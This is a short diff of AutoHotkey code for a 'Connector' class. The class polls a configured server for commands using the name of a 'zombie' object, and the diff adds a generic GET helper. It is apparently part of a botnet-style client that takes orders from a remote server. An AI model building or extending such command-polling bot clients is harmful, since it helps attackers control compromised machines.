@@ -6,16 +6,19 @@ class Connector
 	
 	static HTTP := ComObjCreate("WinHttp.WinHttpRequest.5.1")
 	
-	prepareNotationLink(notation){
-		return this.config.links.notation . "&notation=" . notation
-	}
-	
 	receiveCommands(){
 		this.HTTP.Open("GET", this.config.links.receive . this.zombie.getName(), false)
 		this.HTTP.SetRequestHeader("X-Requested-With", "XMLHttpRequest")
 		this.HTTP.SetRequestHeader("Content-Type", "text/html;charset=UTF-8")
 		this.HTTP.Send()
 		return this.HTTP.ResponseText
+	}
+	
+	sendGet(link){
+		this.HTTP.Open("GET", link, false)
+		this.HTTP.SetRequestHeader("X-Requested-With", "XMLHttpRequest")
+		this.HTTP.SetRequestHeader("Content-Type", "text/html;charset=UTF-8")
+		this.HTTP.Send()
 	}
 	
 	startListen(){
